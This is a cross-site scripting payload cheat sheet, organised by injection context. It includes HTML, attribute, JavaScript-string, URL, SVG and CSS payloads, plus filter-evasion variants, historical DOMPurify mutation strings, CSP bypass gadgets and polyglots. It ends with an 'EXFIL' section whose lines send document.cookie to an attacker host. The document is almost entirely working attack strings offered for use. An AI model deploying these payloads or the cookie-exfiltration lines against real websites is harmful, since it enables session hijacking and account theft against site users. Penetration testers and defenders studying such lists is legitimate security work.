# PAYLOADS: XSS — All Contexts
## Version: 1.0 | Domain: payloads

---

## HTML BODY
```
<script>alert(document.domain)</script>
<svg/onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<audio src onerror=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<form><button formaction=javascript:alert(document.domain)>X
<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>">
<object data="data:text/html,<script>alert(document.domain)</script>">
```

## ATTRIBUTE — DOUBLE QUOTED
```
" autofocus onfocus=alert(document.domain) x="
" onmouseover=alert(document.domain) x="
"><svg/onload=alert(document.domain)>
"><script>alert(document.domain)</script>
```

## ATTRIBUTE — SINGLE QUOTED
```
' autofocus onfocus=alert(document.domain) x='
'><svg/onload=alert(document.domain)>
```

## ATTRIBUTE — UNQUOTED
```
x onmouseover=alert(document.domain) y=
x autofocus onfocus=alert(document.domain) y=
```

## JS STRING — SINGLE QUOTED
```
';alert(document.domain);//
';alert(document.domain);x='
\\';alert(document.domain);//
```

## JS STRING — DOUBLE QUOTED
```
";alert(document.domain);//
";alert(document.domain);x="
```

## JS TEMPLATE LITERAL
```
${alert(document.domain)}
`;alert(document.domain);//
```

## JSON IN <script>
```
"</script><svg/onload=alert(document.domain)>"
"\u003c/script>\u003csvg/onload=alert(document.domain)>"
```

## URL / HREF
```
javascript:alert(document.domain)
JaVaScRiPt:alert(document.domain)
java%0ascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
//evil.tld/x.html
```

## SVG
```
<svg><g/onload=alert(document.domain)></g></svg>
<svg><script>alert(document.domain)</script></svg>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text>X</text></a></svg>
<svg><animate attributeName=href values=javascript:alert(1) /></svg>
```

## CSS
```
<style>@import 'http://evil.tld/x.css';</style>
<link rel=stylesheet href="http://evil.tld/x.css">
<style>*{background:url("javascript:alert(1)")}</style>     /* old browsers */
<style>x{behavior:url('script.htc')}</style>                /* IE only */
```

## FILTER BYPASS — TAG VARIATIONS
```
<sCrIpT>alert(1)</ScRiPt>
<script >alert(1)</script>
<script/x>alert(1)</script>
<script
x>alert(1)</script>
<script ~='~'>alert(1)</script>
<svg/onload=alert(1)>
<svg onload=alert`1`>
<script>alert(1)<!--</script>
```

## EVENT HANDLERS WHEN <script> IS BLOCKED
```
onpointerenter onpointerover onauxclick oncontextmenu
oninput onpointerdown onmouseenter onmouseleave onpointerout
onfocus onblur onfocusin onfocusout
ontoggle onbeforetoggle
onanimationstart onanimationend onanimationiteration
ontransitionstart ontransitionend
```

## DOMPURIFY MUTATIONS (HISTORICAL)
```
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>">
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style></svg>
```

## CSP BYPASSES (CONTEXT-DEPENDENT)
- AngularJS gadget: `<input ng-app ng-csp ng-init="$on.constructor('alert(1)')()">`
- JSONP: `<script src=https://allowed.tld/jsonp?cb=alert>`
- script-src 'self' + uploadable .js: upload `evil.js` with `alert(1)`, then `<script src=/uploads/evil.js>`
- script-src 'unsafe-eval': `<script>setTimeout('alert(1)')</script>`
- Base-URI not set + dangling `<script src=//attacker/x.js>` after `<base href=//attacker>`

## POLYGLOTS
```
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e

"><svg/onload=alert(document.domain)>'-alert(document.domain)-'

/*</style></script><svg onload=alert(1)>
```

## EXFIL
```
new Image().src='https://attacker.tld/?c='+btoa(document.cookie)
fetch('https://attacker.tld/',{method:'POST',body:document.cookie})
navigator.sendBeacon('https://attacker.tld/',document.cookie)
```

## REFERENCES
PortSwigger XSS cheat sheet, PayloadsAllTheThings, OWASP XSS Filter Evasion
